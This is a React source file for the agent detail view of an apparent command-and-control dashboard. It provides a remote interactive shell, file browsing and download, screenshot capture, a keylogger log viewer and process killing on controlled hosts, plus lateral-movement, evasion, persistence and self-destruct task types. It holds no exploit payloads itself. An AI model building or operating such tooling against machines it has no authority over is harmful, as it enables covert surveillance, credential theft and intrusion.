import { useEffect, useState } from 'react'
import { useStore } from '@/stores/useStore'
import { api } from '@/services/api'
import type { Agent, Task, FileTransfer, Screenshot, ProcessInfo, LateralMove, EvasionAction, Module } from '@/types'
import { formatDistanceToNow } from 'date-fns'
import {
  Monitor,
  Terminal,
  FileText,
  Key,
  Keyboard,
  Cpu,
  ArrowRightLeft,
  Shield,
  Zap,
  RefreshCw,
  Download,
  Upload,
  Trash2,
  Copy,
  Eye,
  Play,
  Pause,
  Power,
  Search,
  Plus,
  ChevronLeft,
  ChevronRight,
  Home,
  Wifi,
  WifiOff,
  AlertTriangle,
  XCircle,
  CheckCircle,
  Clock,
  Users,
  Globe,
  MapPin,
  Tag,
  Database,
  HardDrive,
  MemoryStick,
  ShieldAlert,
  AlertCircle,
} from 'lucide-react'
import { GradientBackground } from '@/components/ui/GradientBackground'
import { GradientText } from '@/components/ui/GradientText'
import { DotGrid } from '@/components/ui/DotGrid'
import { Button } from '@/components/ui/Button'
import { Badge } from '@/components/ui/Badge'
import { Input } from '@/components/ui/Input'
import { Card, CardHeader, CardBody } from '@/components/ui/Card'
import { Tabs, TabList, TabTrigger, TabContent } from '@/components/ui/Tabs'
import clsx from 'clsx'

interface AgentDetailContentProps {
  agent: Agent
  activeTab: string
  setActiveTab: (tab: string) => void
}

const statusConfig = {
  online: { icon: CheckCircle, color: 'text-green-500', bg: 'bg-green-500', label: 'Online', border: 'border-green-500/50' },
  offline: { icon: XCircle, color: 'text-red-500', bg: 'bg-red-500', label: 'Offline', border: 'border-red-500/50' },
  stale: { icon: AlertTriangle, color: 'text-yellow-500', bg: 'bg-yellow-500', label: 'Stale', border: 'border-yellow-500/50' },
  dead: { icon: XCircle, color: 'text-red-500', bg: 'bg-red-500', label: 'Dead', border: 'border-red-500/50' },
}

const taskStatusConfig: Record<string, { icon: any; color: string; bg: string; label: string; animate?: boolean }> = {
  pending: { icon: Clock, color: 'text-yellow-500', bg: 'bg-yellow-500', label: 'Pending' },
  running: { icon: RefreshCw, color: 'text-blue-500', bg: 'bg-blue-500', label: 'Running', animate: true },
  completed: { icon: CheckCircle, color: 'text-green-500', bg: 'bg-green-500', label: 'Completed' },
  failed: { icon: AlertCircle, color: 'text-red-500', bg: 'bg-red-500', label: 'Failed' },
  cancelled: { icon: XCircle, color: 'text-dark-500', bg: 'bg-dark-500', label: 'Cancelled' },
}

const taskTypeIcons: Record<string, any> = {
  shell: Terminal,
  file_upload: Upload,
  file_download: Download,
  screenshot: Monitor,
  keylog_start: Keyboard,
  keylog_stop: Keyboard,
  process_list: Cpu,
  module_load: Zap,
  lateral_move: ArrowRightLeft,
  persistence: Shield,
  self_destruct: AlertTriangle,
  update: RefreshCw,
  sleep: Pause,
  custom: Zap,
}

export function AgentDetailContent({ agent, activeTab, setActiveTab }: AgentDetailContentProps) {
  const { tasks, fileTransfers, screenshots, keystrokes, processes, lateralMoves, evasionResults, modules, addNotification, updateTask } = useStore()

  const status = statusConfig[agent.status as keyof typeof statusConfig] || statusConfig.offline
  const StatusIcon = status.icon

  const handleShellCommand = async (cmd: string) => {
    try {
      const task = await api.executeShell(agent.id, cmd)
      addNotification({ type: 'success', message: 'Shell command queued' })
    } catch (error) {
      addNotification({ type: 'error', message: `Failed: ${error}` })
    }
  }

  const handleAction = async (action: string) => {
    try {
      switch (action) {
        case 'screenshot':
          await api.takeScreenshot(agent.id)
          addNotification({ type: 'success', message: 'Screenshot task queued' })
          break
        case 'sleep':
          await api.sleep(agent.id, 300)
          addNotification({ type: 'success', message: 'Sleep task queued (5 min)' })
          break
        case 'update':
          const url = prompt('Enter update URL:')
          if (url) {
            await api.updateAgentBinary(agent.id, url)
            addNotification({ type: 'success', message: 'Update task queued' })
          }
          break
        case 'uninstall':
          if (confirm('Uninstall agent? This cannot be undone.')) {
            await api.uninstall(agent.id)
            addNotification({ type: 'success', message: 'Uninstall task queued' })
          }
          break
      }
    } catch (error) {
      addNotification({ type: 'error', message: `Action failed: ${error}` })
    }
  }

  const privileges = agent.privileges === 1 ? 'SYSTEM' : agent.privileges === 2 ? 'ADMIN' : 'USER'
  const privColors: Record<string, string> = { SYSTEM: 'text-red-400 bg-red-400/20 border-red-400/30', ADMIN: 'text-orange-400 bg-orange-400/20 border-orange-400/30', USER: 'text-blue-400 bg-blue-400/20 border-blue-400/30' }

  // Overview Tab
  if (activeTab === 'overview') {
    return (
      <div className="space-y-6 animate-fade-in">
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
          <Card className="bg-dark-800/50 border-dark-700">
            <CardBody className="p-4">
              <div className="flex items-center gap-3">
                <div className="w-10 h-10 rounded-lg bg-accent-600/20 flex items-center justify-center">
                  <Users className="w-5 h-5 text-accent-400" />
                </div>
                <div>
                  <p className="text-xs text-dark-500">User</p>
                  <p className="font-mono text-dark-100">{agent.username}</p>
                </div>
              </div>
            </CardBody>
          </Card>
          <Card className="bg-dark-800/50 border-dark-700">
            <CardBody className="p-4">
              <div className="flex items-center gap-3">
                <div className="w-10 h-10 rounded-lg bg-blue-600/20 flex items-center justify-center">
                  <Globe className="w-5 h-5 text-blue-400" />
                </div>
                <div>
                  <p className="text-xs text-dark-500">External IP</p>
                  <p className="font-mono text-dark-100">{agent.external_ip}</p>
                </div>
              </div>
            </CardBody>
          </Card>
          <Card className="bg-dark-800/50 border-dark-700">
            <CardBody className="p-4">
              <div className="flex items-center gap-3">
                <div className="w-10 h-10 rounded-lg bg-green-600/20 flex items-center justify-center">
                  <MapPin className="w-5 h-5 text-green-400" />
                </div>
                <div>
                  <p className="text-xs text-dark-500">Location</p>
                  <p className="font-mono text-dark-100 capitalize">{agent.country_code?.toLowerCase() || 'Unknown'}</p>
                </div>
              </div>
            </CardBody>
          </Card>
          <Card className="bg-dark-800/50 border-dark-700">
            <CardBody className="p-4">
              <div className="flex items-center gap-3">
                <div className="w-10 h-10 rounded-lg bg-purple-600/20 flex items-center justify-center">
                  <Tag className="w-5 h-5 text-purple-400" />
                </div>
                <div>
                  <p className="text-xs text-dark-500">Build</p>
                  <p className="font-mono text-dark-100">v{agent.build_version}</p>
                </div>
              </div>
            </CardBody>
          </Card>
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
          <Card className="bg-dark-800/50 border-dark-700">
            <CardHeader className="pb-3">
              <h3 className="font-medium text-dark-100">System Information</h3>
            </CardHeader>
            <CardBody className="space-y-3">
              <div className="grid grid-cols-2 gap-3 text-sm">
                <div><span className="text-dark-500">OS Version</span><p className="font-mono text-dark-100">{agent.os_version}</p></div>
                <div><span className="text-dark-500">Architecture</span><p className="font-mono text-dark-100">{agent.arch}</p></div>
                <div><span className="text-dark-500">Process ID</span><p className="font-mono text-dark-100">{agent.pid}</p></div>
                <div><span className="text-dark-500">Privileges</span><Badge variant="outline" className={privColors[privileges]}>{privileges}</Badge></div>
                <div><span className="text-dark-500">Internal IP</span><p className="font-mono text-dark-100">{agent.internal_ip}</p></div>
                <div><span className="text-dark-500">City</span><p className="font-mono text-dark-100 capitalize">{agent.city || 'Unknown'}</p></div>
                <div><span className="text-dark-500">HWID</span><p className="font-mono text-dark-100 truncate max-w-xs">{agent.hw_id}</p></div>
                <div><span className="text-dark-500">Last Seen</span><p className="font-mono text-dark-100">{agent.last_seen ? formatDistanceToNow(new Date(agent.last_seen), { addSuffix: true }) : 'Never'}</p></div>
              </div>
            </CardBody>
          </Card>

          <Card className="bg-dark-800/50 border-dark-700">
            <CardHeader className="pb-3">
              <h3 className="font-medium text-dark-100">Quick Actions</h3>
            </CardHeader>
            <CardBody className="space-y-2">
              <div className="grid grid-cols-2 gap-2">
                <Button variant="outline" onClick={() => handleAction('screenshot')}>
                  <Monitor className="w-4 h-4 mr-2" /> Screenshot
                </Button>
                <Button variant="outline" onClick={() => setActiveTab('shell')}>
                  <Terminal className="w-4 h-4 mr-2" /> Shell
                </Button>
                <Button variant="outline" onClick={() => setActiveTab('files')}>
                  <FileText className="w-4 h-4 mr-2" /> Files
                </Button>
                <Button variant="outline" onClick={() => setActiveTab('tasks')}>
                  <Terminal className="w-4 h-4 mr-2" /> Tasks
                </Button>
                <Button variant="outline" onClick={() => setActiveTab('processes')}>
                  <Cpu className="w-4 h-4 mr-2" /> Processes
                </Button>
                <Button variant="outline" onClick={() => setActiveTab('keylogger')}>
                  <Keyboard className="w-4 h-4 mr-2" /> Keylogger
                </Button>
              </div>
              <div className="pt-2 border-t border-dark-800 grid grid-cols-2 gap-2">
                <Button variant="outline" onClick={() => setActiveTab('lateral')}>
                  <ArrowRightLeft className="w-4 h-4 mr-2" /> Lateral
                </Button>
                <Button variant="outline" onClick={() => setActiveTab('evasion')}>
                  <Shield className="w-4 h-4 mr-2" /> Evasion
                </Button>
                <Button variant="outline" onClick={() => handleAction('sleep')}>
                  <Pause className="w-4 h-4 mr-2" /> Sleep 5m
                </Button>
                <Button variant="outline" onClick={() => handleAction('update')}>
                  <RefreshCw className="w-4 h-4 mr-2" /> Update
                </Button>
              </div>
              <Button variant="destructive" className="w-full" onClick={() => handleAction('uninstall')}>
                <Power className="w-4 h-4 mr-2" /> Uninstall Agent
              </Button>
            </CardBody>
          </Card>
        </div>

        <Card className="bg-dark-800/50 border-dark-700">
          <CardHeader className="pb-3">
            <h3 className="font-medium text-dark-100">Encryption Keys</h3>
          </CardHeader>
          <CardBody className="space-y-2">
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div>
                <p className="text-xs text-dark-500 mb-1">Encryption Key</p>
                <div className="flex items-center gap-2">
                  <span className="flex-1 font-mono text-xs text-dark-300 bg-dark-900 px-3 py-2 rounded border border-dark-700 select-all">{agent.encryption_key}</span>
                  <Button variant="ghost" size="sm" onClick={() => navigator.clipboard.writeText(agent.encryption_key)}>
                    <Copy className="w-4 h-4" />
                  </Button>
                </div>
              </div>
              <div>
                <p className="text-xs text-dark-500 mb-1">HMAC Key</p>
                <div className="flex items-center gap-2">
                  <span className="flex-1 font-mono text-xs text-dark-300 bg-dark-900 px-3 py-2 rounded border border-dark-700 select-all">{agent.hmac_key}</span>
                  <Button variant="ghost" size="sm" onClick={() => navigator.clipboard.writeText(agent.hmac_key)}>
                    <Copy className="w-4 h-4" />
                  </Button>
                </div>
              </div>
            </div>
          </CardBody>
        </Card>
      </div>
    )
  }

  // Shell Tab
  if (activeTab === 'shell') {
    const [cmd, setCmd] = useState('')
    const [history, setHistory] = useState<{ cmd: string; output: string }[]>([])
    const [shellLoading, setShellLoading] = useState(false)

    const executeCmd = async () => {
      if (!cmd.trim() || shellLoading) return
      setShellLoading(true)
      try {
        const task = await api.executeShell(agent.id, cmd)
        setHistory(prev => [{ cmd, output: task.output || 'Executing...' }, ...prev])
        setCmd('')
        addNotification({ type: 'success', message: 'Command sent' })
      } catch (error) {
        addNotification({ type: 'error', message: `Failed: ${error}` })
      } finally {
        setShellLoading(false)
      }
    }

    return (
      <div className="space-y-4 animate-fade-in">
        <Card className="bg-dark-800/50 border-dark-700 flex flex-col h-[calc(100vh-300px)]">
          <CardHeader className="pb-3">
            <h3 className="font-medium text-dark-100">Interactive Shell</h3>
          </CardHeader>
          <CardBody className="flex-1 flex flex-col min-h-0">
            <div className="flex-1 overflow-y-auto p-4 bg-dark-900/50 rounded-lg border border-dark-700 font-mono text-sm text-dark-300 space-y-4">
              {history.length === 0 ? (
                <div className="text-dark-500 text-center py-8">
                  <p>No commands executed yet</p>
                  <p className="text-xs mt-1">Type a command below and press Enter</p>
                </div>
              ) : (
                history.map((h, i) => (
                  <div key={i} className="border-t border-dark-800 pt-4 first:border-0">
                    <div className="flex items-center gap-2 text-accent-400 mb-1">
                      <span>{`C:\\\\Users\\\\${agent.username}>`}</span>
                      <span className="text-dark-100">{h.cmd}</span>
                    </div>
                    <pre className="text-dark-400 whitespace-pre-wrap break-all">{h.output}</pre>
                  </div>
                ))
              )}
            </div>
            <div className="flex items-center gap-2 mt-4 pt-4 border-t border-dark-800">
              <span className="text-accent-400 font-mono text-sm">{`C:\\\\Users\\\\${agent.username}>`}</span>
              <input
                type="text"
                value={cmd}
                onChange={(e) => setCmd(e.target.value)}
                onKeyDown={(e) => e.key === 'Enter' && executeCmd()}
                className="flex-1 bg-transparent border-none outline-none text-dark-100 font-mono text-sm"
                placeholder="Enter command..."
                disabled={shellLoading}
              />
              <Button size="sm" onClick={executeCmd} disabled={shellLoading || !cmd.trim()}>
                <Play className="w-4 h-4" />
              </Button>
            </div>
          </CardBody>
        </Card>
      </div>
    )
  }

  // Files Tab
  if (activeTab === 'files') {
    const [currentPath, setCurrentPath] = useState('C:\\')
    const [listing, setListing] = useState<any[]>([])
    const [listingLoading, setListingLoading] = useState(false)

    const loadDirectory = async (path: string) => {
      setListingLoading(true)
      try {
        const res = await api.listDirectory(agent.id, path)
        setListing(res)
        setCurrentPath(path)
      } catch (error) {
        addNotification({ type: 'error', message: `Failed to list: ${error}` })
      } finally {
        setListingLoading(false)
      }
    }

    useEffect(() => {
      loadDirectory(currentPath)
    }, [])

    return (
      <div className="space-y-4 animate-fade-in">
        <Card className="bg-dark-800/50 border-dark-700">
          <CardHeader className="pb-3">
            <div className="flex items-center justify-between">
              <h3 className="font-medium text-dark-100">File Manager</h3>
              <div className="flex items-center gap-2">
                <Input placeholder="Remote path" value={currentPath} onChange={(e) => setCurrentPath(e.target.value)} className="w-80" />
                <Button variant="outline" size="sm" onClick={() => loadDirectory(currentPath)} disabled={listingLoading}>
                  <RefreshCw className={`w-4 h-4 ${listingLoading ? 'animate-spin' : ''}`} />
                </Button>
              </div>
            </div>
          </CardHeader>
          <CardBody className="p-0">
            {listingLoading ? (
              <div className="p-8 text-center"><RefreshCw className="w-8 h-8 text-accent-400 animate-spin mx-auto" /></div>
            ) : listing.length === 0 ? (
              <div className="p-8 text-center text-dark-500">Directory empty or inaccessible</div>
            ) : (
              <div className="overflow-x-auto">
                <table className="w-full">
                  <thead>
                    <tr className="border-b border-dark-800 bg-dark-900/50">
                      <th className="px-4 py-3 text-left font-medium text-dark-400">Name</th>
                      <th className="px-4 py-3 text-left font-medium text-dark-400 w-20">Size</th>
                      <th className="px-4 py-3 text-left font-medium text-dark-400 w-24">Type</th>
                      <th className="px-4 py-3 text-left font-medium text-dark-400 w-40">Modified</th>
                      <th className="px-4 py-3 text-left font-medium text-dark-400 w-12"></th>
                    </tr>
                  </thead>
                  <tbody>
                    {listing.map((item) => (
                      <tr key={item.name} className="border-b border-dark-800/50 hover:bg-dark-800/50 cursor-pointer">
                        <td className="px-4 py-3">
                          <div className="flex items-center gap-2">
                            {item.is_directory ? <FileText className="w-4 h-4 text-yellow-400" /> : <FileText className="w-4 h-4 text-dark-400" />}
                            <span className="font-mono text-sm text-dark-100">{item.name}</span>
                          </div>
                        </td>
                        <td className="px-4 py-3 text-dark-400 text-sm font-mono">{item.is_directory ? '-' : (item.size / 1024).toFixed(1) + ' KB'}</td>
                        <td className="px-4 py-3 text-dark-500 text-sm">{item.is_directory ? 'DIR' : 'FILE'}</td>
                        <td className="px-4 py-3 text-dark-500 text-sm">{item.modified || '-'}</td>
                        <td className="px-4 py-3">
                          {!item.is_directory && (
                            <button onClick={() => api.downloadFile(agent.id, `${currentPath}\\${item.name}`.replace(/\\\\/g, '\\'))} className="p-1.5 rounded bg-dark-800 hover:bg-dark-700 text-dark-400 hover:text-accent-400" title="Download">
                              <Download className="w-4 h-4" />
                            </button>
                          )}
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            )}
          </CardBody>
        </Card>
      </div>
    )
  }

  // Tasks Tab
  if (activeTab === 'tasks') {
    const agentTasks = tasks.filter(t => t.agent_id === agent.id)
    
    return (
      <div className="space-y-4 animate-fade-in">
        <Card className="bg-dark-800/50 border-dark-700">
          <CardBody className="p-0">
            {agentTasks.length === 0 ? (
              <div className="p-16 text-center">
                <div className="relative w-16 h-16 mx-auto mb-4">
                  <DotGrid className="absolute inset-0" dotSize={3} gap={16} baseColor="#1e293b" activeColor="#d946ef" proximity={80} />
                  <Terminal className="w-8 h-8 text-dark-600 relative mx-auto" />
                </div>
                <h3 className="text-lg font-medium text-dark-300 mb-1">No tasks</h3>
                <p className="text-dark-500">Tasks will appear here when queued</p>
              </div>
            ) : (
              <div className="overflow-x-auto">
                <table className="w-full">
                  <thead>
                    <tr className="border-b border-dark-800 bg-dark-900/50">
                      <th className="px-4 py-3 text-left font-medium text-dark-400">Type</th>
                      <th className="px-4 py-3 text-left font-medium text-dark-400">Command</th>
                      <th className="px-4 py-3 text-left font-medium text-dark-400 w-28">Status</th>
                      <th className="px-4 py-3 text-left font-medium text-dark-400 w-40">Created</th>
                      <th className="px-4 py-3 text-left font-medium text-dark-400 w-40">Completed</th>
                      <th className="px-4 py-3 text-left font-medium text-dark-400">Output</th>
                      <th className="px-4 py-3 text-left font-medium text-dark-400 w-12"></th>
                    </tr>
                  </thead>
                  <tbody>
                    {agentTasks.map((task) => {
                      const cfg = taskStatusConfig[task.status] || taskStatusConfig.pending
                      const StatusIcon = cfg.icon
                      const TypeIcon = taskTypeIcons[task.type] || Terminal
                      
                      return (
                        <tr key={task.id} className="border-b border-dark-800/50 hover:bg-dark-800/50">
                          <td className="px-4 py-3">
                            <div className="flex items-center gap-2">
                              <TypeIcon className="w-4 h-4 text-accent-400" />
                              <span className="font-mono text-sm text-dark-100 capitalize">{task.type.replace('_', ' ')}</span>
                            </div>
                          </td>
                          <td className="px-4 py-3">
                            <span className="font-mono text-sm text-dark-300 max-w-xs truncate block">{task.command}</span>
                          </td>
                          <td className="px-4 py-3">
                            <Badge variant="outline" className={clsx(cfg.color, cfg.bg + '/20')}>
                              <StatusIcon className={`w-3 h-3 mr-1 ${cfg.animate ? 'animate-spin' : ''}`} />
                              {cfg.label}
                            </Badge>
                          </td>
                          <td className="px-4 py-3 text-dark-400 text-sm">
                            {task.created_at ? formatDistanceToNow(new Date(task.created_at), { addSuffix: true }) : '-'}
                          </td>
                          <td className="px-4 py-3 text-dark-400 text-sm">
                            {task.completed_at ? formatDistanceToNow(new Date(task.completed_at), { addSuffix: true }) : '-'}
                          </td>
                          <td className="px-4 py-3 text-dark-500 text-sm max-w-xs truncate font-mono">
                            {task.output?.slice(0, 100) || '-'}
                          </td>
                          <td className="px-4 py-3">
                            {(task.output || task.error) && (
                              <button onClick={() => navigator.clipboard.writeText(task.output || task.error || '')} className="p-1.5 rounded bg-dark-800 hover:bg-dark-700 text-dark-400 hover:text-accent-400" title="Copy">
                                <Copy className="w-4 h-4" />
                              </button>
                            )}
                          </td>
                        </tr>
                      )
                    })}
                  </tbody>
                </table>
              </div>
            )}
          </CardBody>
        </Card>
      </div>
    )
  }

  // Screenshots Tab
  if (activeTab === 'screenshots') {
    const agentShots = screenshots.filter(s => s.agent_id === agent.id)
    const [selectedShot, setSelectedShot] = useState<string | null>(null)

    return (
      <div className="space-y-4 animate-fade-in">
        <Card className="bg-dark-800/50 border-dark-700">
          <CardBody className="p-0">
            {agentShots.length === 0 ? (
              <div className="p-16 text-center">
                <div className="relative w-16 h-16 mx-auto mb-4">
                  <DotGrid className="absolute inset-0" dotSize={3} gap={16} baseColor="#1e293b" activeColor="#d946ef" proximity={80} />
                  <Monitor className="w-8 h-8 text-dark-600 relative mx-auto" />
                </div>
                <h3 className="text-lg font-medium text-dark-300 mb-1">No screenshots</h3>
                <p className="text-dark-500">Take a screenshot to see it here</p>
              </div>
            ) : (
              <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-4 p-4">
                {agentShots.map((shot) => (
                  <div key={shot.id} className="group relative bg-dark-800/50 border border-dark-700 rounded-lg overflow-hidden transition-all hover:border-accent-500/50 hover:shadow-lg">
                    <div className="aspect-video bg-dark-900 relative overflow-hidden">
                      <div className="w-full h-full bg-gradient-to-br from-accent-900/30 to-purple-900/30 flex items-center justify-center">
                        <Monitor className="w-12 h-12 text-accent-400/50" />
                      </div>
                      <div className="absolute inset-0 bg-black/50 opacity-0 group-hover:opacity-100 transition-opacity flex items-center justify-center gap-2">
                        <button onClick={() => api.downloadScreenshot(shot.id).then(blob => { const url = URL.createObjectURL(blob); const a = document.createElement('a'); a.href = url; a.download = `screenshot-${shot.id}.png`; a.click(); URL.revokeObjectURL(url); })} className="p-2 bg-dark-900/80 hover:bg-dark-800 rounded-lg text-dark-300 hover:text-accent-400" title="Download">
                          <Download className="w-5 h-5" />
                        </button>
                        <button onClick={() => setSelectedShot(shot.id)} className="p-2 bg-dark-900/80 hover:bg-dark-800 rounded-lg text-dark-300 hover:text-accent-400" title="View">
                          <Eye className="w-5 h-5" />
                        </button>
                      </div>
                    </div>
                    <div className="p-3 space-y-1">
                      <p className="font-mono text-xs text-dark-300 truncate">{shot.filename}</p>
                      <div className="flex items-center justify-between text-xs text-dark-500">
                        <span>{shot.width}x{shot.height}</span>
                        <span>{(shot.size / 1024).toFixed(1)} KB</span>
                        <span>{formatDistanceToNow(new Date(shot.taken_at), { addSuffix: true })}</span>
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </CardBody>
        </Card>

        {selectedShot && (
          <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/90 animate-fade-in" onClick={() => setSelectedShot(null)}>
            <div className="relative max-w-4xl max-h-[90vh] w-full mx-4">
              <button onClick={() => setSelectedShot(null)} className="absolute top-4 right-4 z-10 p-2 bg-dark-900/80 rounded-full text-dark-400 hover:text-white">
                <XCircle className="w-6 h-6" />
              </button>
              <img src={`/api/screenshots/${selectedShot}/download`} alt="Screenshot" className="w-full h-auto rounded-lg" />
            </div>
          </div>
        )}
      </div>
    )
  }

  // Keylogger Tab
  if (activeTab === 'keylogger') {
    const agentKeys = keystrokes.filter(k => k.agent_id === agent.id)
    const [searchQuery, setSearchQuery] = useState('')

    const filtered = agentKeys.filter((k) => {
      if (!searchQuery) return true
      const q = searchQuery.toLowerCase()
      return k.window_title.toLowerCase().includes(q) || k.process_name.toLowerCase().includes(q) || k.keys.toLowerCase().includes(q)
    })

    return (
      <div className="space-y-4 animate-fade-in">
        <Card className="bg-dark-800/50 border-dark-700 mb-4">
          <CardBody className="p-4">
            <div className="relative max-w-md">
              <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-dark-500" />
              <input type="text" placeholder="Search keystrokes..." value={searchQuery} onChange={(e) => setSearchQuery(e.target.value)} className="w-full pl-10 pr-4 py-2 bg-dark-900 border border-dark-700 rounded-lg text-dark-100 placeholder-dark-500 focus:outline-none focus:ring-2 focus:ring-accent-500" />
            </div>
          </CardBody>
        </Card>

        <Card className="bg-dark-800/50 border-dark-700">
          <CardBody className="p-0">
            {filtered.length === 0 ? (
              <div className="p-16 text-center">
                <div className="relative w-16 h-16 mx-auto mb-4">
                  <DotGrid className="absolute inset-0" dotSize={3} gap={16} baseColor="#1e293b" activeColor="#d946ef" proximity={80} />
                  <Keyboard className="w-8 h-8 text-dark-600 relative mx-auto" />
                </div>
                <h3 className="text-lg font-medium text-dark-300 mb-1">No keystrokes</h3>
                <p className="text-dark-500">Start keylogging to capture input</p>
              </div>
            ) : (
              <div className="overflow-x-auto">
                <table className="w-full">
                  <thead>
                    <tr className="border-b border-dark-800 bg-dark-900/50">
                      <th className="px-4 py-3 text-left font-medium text-dark-400">Window</th>
                      <th className="px-4 py-3 text-left font-medium text-dark-400">Process</th>
                      <th className="px-4 py-3 text-left font-medium text-dark-400">Keys</th>
                      <th className="px-4 py-3 text-left font-medium text-dark-400 w-40">Time</th>
                      <th className="px-4 py-3 text-left font-medium text-dark-400 w-12"></th>
                    </tr>
                  </thead>
                  <tbody>
                    {filtered.map((key) => (
                      <tr key={key.id} className="border-b border-dark-800/50 hover:bg-dark-800/50">
                        <td className="px-4 py-3 text-dark-300 text-sm max-w-xs truncate">{key.window_title}</td>
                        <td className="px-4 py-3 text-dark-400 font-mono text-sm">{key.process_name}</td>
                        <td className="px-4 py-3"><span className="font-mono text-sm text-dark-100 bg-dark-900 px-2 py-1 rounded">{key.keys}</span></td>
                        <td className="px-4 py-3 text-dark-400 text-sm">{key.timestamp ? formatDistanceToNow(new Date(key.timestamp), { addSuffix: true }) : '-'}</td>
                        <td className="px-4 py-3"><button onClick={() => navigator.clipboard.writeText(JSON.stringify(key, null, 2))} className="p-1.5 rounded bg-dark-800 hover:bg-dark-700 text-dark-400 hover:text-accent-400"><Copy className="w-4 h-4" /></button></td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            )}
          </CardBody>
        </Card>
      </div>
    )
  }

  // Processes Tab
  if (activeTab === 'processes') {
    const agentProcs = processes.filter(p => p.agent_id === agent.id)
    const [searchQuery, setSearchQuery] = useState('')
    const [sortConfig, setSortConfig] = useState<{ key: string; direction: 'asc' | 'desc' }>({ key: 'cpu_percent', direction: 'desc' })

    const filtered = agentProcs.filter((p) => {
      if (!searchQuery) return true
      const q = searchQuery.toLowerCase()
      return p.name.toLowerCase().includes(q) || p.cmdline?.toLowerCase().includes(q) || p.username?.toLowerCase().includes(q)
    }).sort((a, b) => {
      const aVal = (a as any)[sortConfig.key]
      const bVal = (b as any)[sortConfig.key]
      if (aVal < bVal) return sortConfig.direction === 'asc' ? -1 : 1
      if (aVal > bVal) return sortConfig.direction === 'asc' ? 1 : -1
      return 0
    })

    const handleSort = (key: string) => {
      setSortConfig((prev) => ({ key, direction: prev.key === key && prev.direction === 'asc' ? 'desc' : 'asc' }))
    }

    const handleProcAction = async (action: string, pid: number) => {
      try {
        if (action === 'suspend') await api.suspendProcess(agent.id, pid)
        if (action === 'resume') await api.resumeProcess(agent.id, pid)
        if (action === 'kill') await api.killProcess(agent.id, pid)
        addNotification({ type: 'success', message: `Process ${action}ed` })
      } catch (error) {
        addNotification({ type: 'error', message: `Failed: ${error}` })
      }
    }

    return (
      <div className="space-y-4 animate-fade-in">
        <Card className="bg-dark-800/50 border-dark-700 mb-4">
          <CardBody className="p-4">
            <div className="relative max-w-md">
              <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-dark-500" />
              <input type="text" placeholder="Search processes..." value={searchQuery} onChange={(e) => setSearchQuery(e.target.value)} className="w-full pl-10 pr-4 py-2 bg-dark-900 border border-dark-700 rounded-lg text-dark-100 placeholder-dark-500 focus:outline-none focus:ring-2 focus:ring-accent-500" />
            </div>
          </CardBody>
        </Card>

        <Card className="bg-dark-800/50 border-dark-700">
          <CardBody className="p-0">
            <div className="overflow-x-auto">
              <table className="w-full">
                <thead>
                  <tr className="border-b border-dark-800 bg-dark-900/50">
                    <th className="px-4 py-3 text-left font-medium text-dark-400 cursor-pointer" onClick={() => handleSort('pid')}>PID</th>
                    <th className="px-4 py-3 text-left font-medium text-dark-400 cursor-pointer" onClick={() => handleSort('name')}>Name</th>
                    <th className="px-4 py-3 text-left font-medium text-dark-400">User</th>
                    <th className="px-4 py-3 text-left font-medium text-dark-400 cursor-pointer" onClick={() => handleSort('cpu_percent')}>CPU %</th>
                    <th className="px-4 py-3 text-left font-medium text-dark-400 cursor-pointer" onClick={() => handleSort('memory_mb')}>Memory</th>
                    <th className="px-4 py-3 text-left font-medium text-dark-400">Status</th>
                    <th className="px-4 py-3 text-left font-medium text-dark-400">Path</th>
                    <th className="px-4 py-3 text-left font-medium text-dark-400 w-28"></th>
                  </tr>
                </thead>
                <tbody>
                  {filtered.map((proc) => (
                    <tr key={proc.id} className="border-b border-dark-800/50 hover:bg-dark-800/50">
                      <td className="px-4 py-3 font-mono text-sm text-dark-100">{proc.pid}</td>
                      <td className="px-4 py-3 text-dark-300 font-mono text-sm max-w-xs truncate">{proc.name}</td>
                      <td className="px-4 py-3 text-dark-400 text-sm">{proc.username || 'SYSTEM'}</td>
                      <td className="px-4 py-3"><span className={clsx('font-mono text-sm', proc.cpu_percent > 50 ? 'text-red-400' : proc.cpu_percent > 10 ? 'text-yellow-400' : 'text-green-400')}>{proc.cpu_percent.toFixed(1)}%</span></td>
                      <td className="px-4 py-3 text-dark-400 font-mono text-sm">{proc.memory_mb} MB</td>
                      <td className="px-4 py-3"><Badge variant="outline" className={proc.status === 'running' ? 'bg-green-600/20 text-green-400' : 'bg-yellow-600/20 text-yellow-400'}>{proc.status}</Badge></td>
                      <td className="px-4 py-3 text-dark-500 text-sm truncate max-w-xs font-mono">{proc.path || '-'}</td>
                      <td className="px-4 py-3">
                        <div className="flex items-center gap-1">
                          <button onClick={() => handleProcAction(proc.status === 'running' ? 'suspend' : 'resume', proc.pid)} className="p-1.5 rounded bg-dark-800 hover:bg-dark-700 text-dark-400 hover:text-accent-400" title={proc.status === 'running' ? 'Suspend' : 'Resume'}>{proc.status === 'running' ? <Pause className="w-4 h-4" /> : <Play className="w-4 h-4" />}</button>
                          <button onClick={() => handleProcAction('kill', proc.pid)} className="p-1.5 rounded bg-dark-800 hover:bg-red-900/20 text-dark-400 hover:text-red-400" title="Kill"><XCircle className="w-4 h-4" /></button>
                        </div>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          </CardBody>
        </Card>
      </div>
    )
  }

  // Other tabs - simplified
  return (
    <div className="animate-fade-in">
      <Card className="bg-dark-800/50 border-dark-700">
        <CardBody className="p-8 text-center">
          <div className="relative w-16 h-16 mx-auto mb-4">
            <DotGrid className="absolute inset-0" dotSize={3} gap={16} baseColor="#1e293b" activeColor="#d946ef" proximity={80} />
            <Monitor className="w-8 h-8 text-dark-600 relative mx-auto" />
          </div>
          <h3 className="text-lg font-medium text-dark-300 mb-1">{activeTab.charAt(0).toUpperCase() + activeTab.slice(1)}</h3>
          <p className="text-dark-500">Content for {activeTab} tab</p>
        </CardBody>
      </Card>
    </div>
  )
}